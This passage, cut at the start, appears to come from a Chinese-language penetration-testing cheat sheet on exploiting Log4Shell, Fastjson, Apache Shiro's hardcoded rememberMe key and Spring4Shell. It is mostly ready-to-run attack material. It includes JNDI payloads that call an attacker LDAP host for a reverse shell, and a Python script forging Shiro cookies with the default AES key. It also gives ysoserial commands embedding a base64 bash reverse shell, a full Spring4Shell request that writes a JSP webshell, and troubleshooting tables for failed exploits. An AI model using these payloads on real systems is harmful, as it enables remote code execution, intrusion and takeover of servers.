curl -i "http://TARGET/search?q=${jndi:dns://test2-x.dnslog.cn}"
```
预期结果：DNSLog 面板出现目标 IP 的解析记录 → Log4Shell 确认（User-Agent 命中最常见）。没记录 → 版本已修（2.15+）或没打进日志，换注入点。

#### 第 5 步：Log4Shell RCE 与 JDK 版本适配
确认存在后用 LDAP 服务打 RCE（服务同第 2 步）：
```bash
curl -i "http://TARGET/" \
  -H 'User-Agent: ${jndi:ldap://ATTACKER:1389/Exploit}'
```
预期结果：HTTP 服务收到 `GET /Exploit.class`，反弹 shell 落地。如果「DNSLog 通但 LDAP 不通」：
- 目标 JDK ≥ 8u191 / 11.0.1：默认禁止远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false`），LDAP 加载远程类会失败。对策：用**本地类**（如目标 classpath 里的 Tomcat ELProcessor / Groovy）构造 gadget，或改打 RMI + 序列化 gadget。
- 高版本 JDK（11.0.2+ 且开了强限制）连 JNDI 拼接都拦，只能打回显类 gadget。
盲打顺序永远：dnslog 验证 → LDAP 尝试 → 本地类 gadget，一步步收紧。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| Fastjson 1.2.24 payload 无反应 | 目标可能不是 1.2.24 / 解析函数不同 | 确认 `JSON.parseObject` 而非 `JSON.parse`；用 DNSLog 类 payload 盲测：`{"@type":"java.net.InetAddress","val":"x.dnslog.cn"}` |
| 1.2.47 两步打了还是不通 | 版本 >1.2.47 或 autoType 被显式关闭 | 看报错里的版本号；新版试 `{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"}` 系（依赖 Feature.SupportNonPublicField） |
| DNSLog 有记录但 LDAP 不加载 class | 高版本 JDK 禁远程 codebase | 换本地类 gadget（Tomcat EL / Groovy / CommonsBeanutils + RMI） |
| 反弹 shell 收到但秒断 | 恶意类里命令写错 | class 里命令先 base64，`bash -c {echo,...}` 写法；确认开启 `/bin/bash` 存在 |
| Log4j 2.15 / 2.16 之间版本行为差异 | 2.16 已默认禁用 JNDI | 先验证版本，2.16+ 基本不能打，换其他漏洞面 |

#### 实战要点
1. 永远先带外验证（DNSLog）再上 RCE payload：一条 User-Agent 就能测 Log4j，成本极低。
2. Fastjson 的 `@type` 特征本身会暴露版本与修复情况，报错信息里带版本就白送信息。
3. JNDI 服务端口要大候选（1389 LDAP / 1099 RMI 都起一个），payload 里 ldap/rmi 两种都备。
4. 恶意 class 最好做成「一次执行后自删或带参」，避免同一 class 被多个请求重复执行导致命令叠加。
5. 这两条链在真实目标上经常同时存在（业务用 Fastjson 接收 + 框架用 Log4j2 记日志），一次打点两套验证。

> [!warn] JNDI 利用依赖目标能出网访问 LDAP/RMI；高版本 JDK 默认禁止远程 codebase，需配合本地 class 或序列化 gadget。
> [!tip] 先打带外验证（DNSLog：`${jndi:dns://x.dnslog.cn}`）确认漏洞真实存在，再上 RCE 载荷。

### [cve-shiro-spring] Shiro 默认密钥与 Spring4Shell 速查 | medium | CVE;反序列化;认证绕过 | CVE-2016-4437;CVE-2022-22965
> Shiro rememberMe 硬编码 AES 密钥与 Spring 表单绑定写 shell，两条 Java 框架高频洞。

#### 这个条目的作用
Apache Shiro 和 Spring（Spring MVC / Spring Boot 全家）是 Java Web 双巨头。Shiro 的历史版本把 rememberMe 的 AES 加密密钥写死在代码里（硬编码），攻击者能用这把钥匙伪造任意序列化对象让服务端反序列化 = RCE（Shiro-550）；Spring 的 Spring4Shell 则是通过表单绑定改 Tomcat 配置写 JSP webshell。两条都是「只要框架版本对、配置默认，就一发入魂」的洞，必须会判、会打。

#### 前置条件
- Shiro：目标响应里出现过 `rememberMe=deleteMe` cookie（判定标志，见第 1 步），且版本 ≤1.2.4 或仍用硬编码默认密钥。
- Shiro 利用需要本机 Java 环境（ysoserial + 自己写的小工具做 AES 加解密），出网做反弹。
- Spring4Shell：目标为 Tomcat WAR 部署 + JDK 9+ + spring-webmvc/webflux 且数据绑定到对象（不是 @RequestParam 拆参），第 3 步会教你怎么判。
- 都在授权范围内，先验证后打。

#### 第 1 步：Shiro 判定（rememberMe 特征）
```bash
# 发一个带 rememberMe 的请求，看响应
curl -i "http://TARGET/login" \
  -H 'Cookie: rememberMe=1'
```
预期结果：响应 `Set-Cookie` 里出现 `rememberMe=deleteMe;`（注意大小写与 value 拼写）→ 目标启用 Shiro 的 rememberMe。没出现 → 可能关闭了 rememberMe 功能，本条目后半段（Spring4Shell）仍可继续。出现后进入第 2 步验证密钥。

#### 第 2 步：验证默认密钥并打 Shiro-550（CVE-2016-4437）
Shiro 默认密钥是 `kPH+bIxk5D2deZiIxcaaaA==`（Base64，AES/CBC/PKCS5Padding，记得加 IV=密钥本身的前 16 字节）。手工验证 + 利用流程：
```bash
# ① 用 ysoserial 生成 URLDNS 链做无害带外验证
java -jar ysoserial.jar URLDNS "http://shiro-test.x.dnslog.cn" > urldns.ser
# ② 用工具（shiro_attack 或自写脚本）把 urldns.ser 用默认密钥加密成 rememberMe cookie
#    Python 核心片段（AES-CBC，key=base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")，IV=key 前16字节）
python3 -c "
import base64, uuid
from Crypto.Cipher import AES
key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = key[:16]   # Shiro 的 IV 就是密钥前 16 字节
data = open('urldns.ser','rb').read()
pad = 16 - len(data) % 16
data += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv).encrypt(data)
print(base64.b64encode(cipher).decode())
"
```
把输出的 cookie 放进请求：
```bash
curl -i "http://TARGET/" -H "Cookie: rememberMe=<上一步输出>"
```
预期结果：DNSLog 出现目标 IP 解析 → 密钥验证成功，漏洞确认。把 URLDNS 换成通用反序列化 gadget 打 RCE：
```bash
# ③ 生成命令执行链（bash 反弹或命令回显）
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaC1p...}|{base64,-d}|{bash,-i}" > cc5.ser
# ④ 同样用默认密钥加密成 rememberMe，再发一次
curl -i "http://TARGET/" -H "Cookie: rememberMe=<加密后的cookie>"
```
预期结果：攻击机收到反弹 shell。CompressableCollection 系 gadget 按目标 JDK 版本挑选（CC5/CC6/CC7 多试几个）。密钥验证失败 → 目标换了密钥，第 2 步的补充说明里给了兜底。

#### 第 3 步：Spring4Shell（CVE-2022-22965）判定
先判断部署形态（关键前提）：
```bash
# ① 看响应头里的 Server / X-Powered-By
curl -i "http://TARGET/"
# ② 找一个 POST 表单接口（登录、注册、改资料），确认数据绑定方式是「对象绑定」而非 @RequestParam
curl -i -X POST "http://TARGET/register" -d "name=test"
```
预期结果：`Server: Apache-Coyote/1.1` 或响应含 Tomcat 特征 → WAR 部署候选。若目标是 Spring Boot 内嵌容器（响应头更像 Netty/spring 无 Tomcat 特征，或 8080 单端口起）→ 大概率不中此洞，但可测（部分版本也中）。确认形态后进入第 4 步。

#### 第 4 步：Spring4Shell 写 JSP 落地
利用数据绑定改 Tomcat 的 AccessLogValve 配置，把访问日志写成 JSP：
```bash
# ① 先无害测试「配置是否可写」：POST 一个不存在字段，观察 400 报错差异
# ② 正式 payload：pattern 设为存储型命令执行 JSP，suffix 强制 .jsp
curl -X POST "http://TARGET/register" \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22pwned%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getClass().getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=pwned&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
```
```bash
# ③ 触发日志写入（随意请求一次），然后访问 webshell
curl "http://TARGET/pwned.jsp?pwd=pwned&cmd=id"
```
预期结果：`pwned.jsp` 回显 `uid=...` 命令输出 → 写 shell 成功。请求 404 → 检查 `directory` 路径是否应为 `webapps/ROOT`（WAR 应用）或 `ROOT` 变体、`prefix`/`suffix` 参数是否被框架吃掉（可拆成多次小请求逐字段验证）。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 没有 `rememberMe=deleteMe` 特征 | Shiro 关闭了 rememberMe 或版本太新 | 检查登录接口是否有 rememberMe 复选框；换 Shiro key 字典全量跑（shiro_attack 的 key 字典）或放弃此洞 |
| URLDNS 验证无记录 | 默认密钥被换 / 不出网 | 跑全部已知密钥字典（几十个硬编码密钥开源收集）；换成 dnslog 域再次验证 |
| 反序列化 gadget 全 500 | 目标 JDK 版本不兼容 | 按 JDK 换链：JDK6 用 CC5，JDK8 用 CC6/CC7，JDK11+ 用 CommonsBeanutils1 |
| Spring4Shell 请求 400 Bad Request | 参数绑定被 @RequestParam 拆开 | 确认接口是对象绑定；换参数路径（`class.module.classLoader...` 不同中间件路径不同，Jetty 走 `class.module.classLoader.resources.context...` 改法不同） |
| 写了 JSP 但访问 404 | directory / prefix 配置不对或写到了别的 context | 分别验证 `directory` 指向真实 webapps 目录（WAR：`webapps/ROOT`；解压部署：`webapps/<app名>`）；日志文件名 = prefix + 日期(默认 .YYYY-MM-DD) + suffix，先访问实际名字 |

#### 实战要点
1. Shiro 的 `rememberMe=deleteMe` 是最经典指纹，扫一遍全站 cookie 即知；URLDNS 验证永远先于 RCE payload。
2. Shiro 的密钥工具链：shiro_attack 图形工具 / ysoserial + 自写 AES 脚本，三件套备齐再开打。
3. Spring4Shell 只对「Tomcat WAR + JDK9+ + 对象绑定」生效，Spring Boot 内嵌容器通常不中——先验证部署形态，别在 Boot 应用上浪费时间。
4. Spring 家族一起测：CVE-2022-22947（Spring Cloud Gateway SpEL）、CVE-2022-22963（Spring Cloud Function SpEL），一个应用可能中多个。
5. 两条链的报错信息（400 具体字段、反序列化堆栈）都是版本指纹，先读报错再选 payload，效率翻倍。

> [!warn] Spring4Shell 只对特定部署形态生效（Tomcat WAR + JDK9+），Spring Boot 内嵌容器通常不中；先满足条件再打。
> [!tip] Shiro 打不通默认密钥可跑全部密钥字典或 URLDNS 带外验证；Spring 系列还有 CVE-2022-22947（Gateway）与 CVE-2022-22963（SpEL 表达式注入）可一起测。